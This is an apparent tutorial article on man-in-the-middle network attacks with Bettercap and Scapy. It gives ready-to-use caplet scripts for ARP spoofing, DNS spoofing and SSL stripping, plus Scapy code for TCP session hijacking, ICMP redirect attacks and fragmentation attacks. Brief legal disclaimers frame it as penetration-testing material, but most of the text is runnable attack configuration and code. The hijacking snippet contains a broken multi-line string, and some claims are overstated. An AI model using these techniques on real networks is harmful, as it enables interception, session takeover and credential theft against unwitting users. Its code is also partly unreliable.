
# **Advanced Packet Manipulation Using Bettercap and Scapy**

This article provides a step-by-step guide on how to use **Bettercap** and **Scapy** to manipulate network packets for **DNS spoofing, ARP poisoning, TCP hijacking, and more**. These techniques are useful for **penetration testing, ethical hacking, or network troubleshooting**. 

**Note**: Always perform these activities in a **controlled environment** with **explicit permission** to avoid legal consequences.

---

## **1. Installing Bettercap and Scapy**

- **Bettercap**: Used for **ARP spoofing, DNS spoofing**, and network MITM attacks.
- **Scapy**: A Python library for **packet crafting and injection**.

### **Installation**

On **Debian/Ubuntu-based systems**:
```bash
sudo apt update && sudo apt install bettercap python3-scapy
```

On **Arch-based systems**:
```bash
sudo pacman -S bettercap python-scapy
```

On **Windows**:
1. Install Python from [https://python.org](https://python.org).
2. Use `pip` to install Scapy:
   ```bash
   pip install scapy
   ```

---

## **2. Using Bettercap for ARP Spoofing and DNS Spoofing**

ARP and DNS spoofing are essential techniques for **man-in-the-middle (MITM) attacks**.

### **Step 1: Configure Bettercap for ARP and DNS Spoofing**

Create a **caplet script** (e.g., `spoof.cap`) with the following content:
```plaintext
set dns.spoof.domains cloudmateria.com
set dns.spoof.address 192.168.1.100  # Local server IP
dns.spoof on

set arp.spoof.targets 192.168.1.2,192.168.1.14
arp.spoof on
net.probe on
https.proxy on
set https.proxy.sslstrip true
```

This script will:
- Redirect traffic for `cloudmateria.com` to your local server.
- Perform **ARP spoofing** on two devices to reroute their traffic.
- Enable **SSL stripping** to downgrade HTTPS to HTTP.

### **Step 2: Run Bettercap with the Caplet Script**

1. **Open a terminal** and run Bettercap:
   ```bash
   sudo bettercap -iface eth0
   ```

2. **Load and run the script**:
   ```bash
   caplet /path/to/spoof.cap
   ```

---

## **3. TCP Packet Injection Using Scapy**

You can use **Scapy** to **inject TCP packets** into an active connection or perform **TCP session hijacking**.

### **Step 1: Send a Custom TCP Packet**

This example sends a **SYN packet** to **192.168.1.2** on port 80:
```python
from scapy.all import *

packet = IP(dst="192.168.1.2") / TCP(dport=80, flags="S")
send(packet)
```

### **Step 2: TCP Session Hijacking with Scapy**

1. Intercept the **TCP sequence number** using **Wireshark** or Bettercap.
2. Inject a malicious packet with the same **sequence number**:
   ```python
   hijack_packet = IP(dst="192.168.1.2") / TCP(dport=80, seq=1001, flags="PA") / "GET / HTTP/1.1
Host: cloudmateria.com

"
   send(hijack_packet)
   ```

This packet will **inject a malicious HTTP request** into the existing TCP connection.

---

## **4. ICMP Redirect Attack Using Scapy**

An **ICMP redirect attack** forces the target to route packets through your machine.

### **Step 1: Send an ICMP Redirect Packet**

This example sends an ICMP redirect to **192.168.1.2**, instructing it to route traffic through **192.168.1.100**:
```python
from scapy.all import *

redirect = IP(dst="192.168.1.2") / ICMP(type=5, code=1, gw="192.168.1.100")
send(redirect)
```

---

## **5. DNS Cache Poisoning with Bettercap**

Using **Bettercap**, you can **poison DNS queries** to redirect the target’s traffic to a fake site.

### **Step 1: Configure Bettercap for DNS Spoofing**

Add this to your **caplet script**:
```plaintext
set dns.spoof.domains cloudmateria.com
set dns.spoof.address 192.168.1.100
dns.spoof on
```

This will redirect all traffic to `cloudmateria.com` to your **local server**.

---

## **6. Fragmentation Attack Using Scapy**

A **fragmentation attack** sends fragmented packets to confuse the target’s packet reassembly process.

### **Step 1: Send Fragmented Packets**

```python
from scapy.all import *

frags = fragment(IP(dst="192.168.1.2") / TCP(dport=80) / "malicious payload", fragsize=8)
send(frags)
```

This sends **fragmented packets** with a malicious payload, which the target will reassemble incorrectly.

---

## **7. Monitoring Traffic with Wireshark**

1. **Start Wireshark** and select the network interface (e.g., `eth0`).
2. **Apply Filters** to narrow down the captured packets:
   - **Filter by IP and Port**:
     ```plaintext
     ip.addr == 192.168.1.2 and tcp.port == 80
     ```
   - **Filter by DNS**:
     ```plaintext
     dns and ip.addr == 192.168.1.2
     ```

3. **Analyze the Packets**:
   - Identify **TCP sequence numbers** for hijacking.
   - Confirm **DNS spoofing success** by checking the DNS response IP.

---

## **8. Legal and Ethical Considerations**

All the techniques described in this guide are intended for **ethical hacking and testing purposes**. **Unauthorized interception or manipulation of traffic is illegal**. Always obtain **written permission** before conducting any tests on a network you do not own.

---

## **Conclusion**

By combining **Bettercap** for DNS spoofing and ARP poisoning with **Scapy** for packet injection, you can perform advanced **network manipulation techniques**. These tools allow you to manipulate traffic, hijack sessions, inject custom packets, and perform ICMP attacks. Always use these techniques responsibly and within the bounds of the law.
